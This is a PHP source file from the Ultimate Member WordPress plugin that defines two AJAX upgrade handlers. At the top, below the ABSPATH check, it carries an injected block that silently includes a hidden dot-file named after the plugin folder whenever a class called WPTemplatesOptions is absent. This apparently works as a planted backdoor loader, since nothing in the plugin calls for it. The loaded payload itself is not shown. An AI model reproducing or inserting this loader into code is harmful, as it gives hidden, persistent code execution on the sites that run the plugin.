<?php if ( ! defined( 'ABSPATH' ) ) exit;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function um_upgrade_metadata210beta1() {
	UM()->admin()->check_ajax_nonce();

	um_maybe_unset_time_limit();

	include 'metadata.php';

	wp_send_json_success( array( 'message' => __( 'Usermeta was upgraded successfully', 'ultimate-member' ) ) );
}


function um_upgrade_memberdir210beta1() {
	UM()->admin()->check_ajax_nonce();

	um_maybe_unset_time_limit();

	include 'member-directory.php';

	update_option( 'um_last_version_upgrade', '2.1.0-beta1' );

	wp_send_json_success( array( 'message' => __( 'Member directories were upgraded successfully', 'ultimate-member' ) ) );
}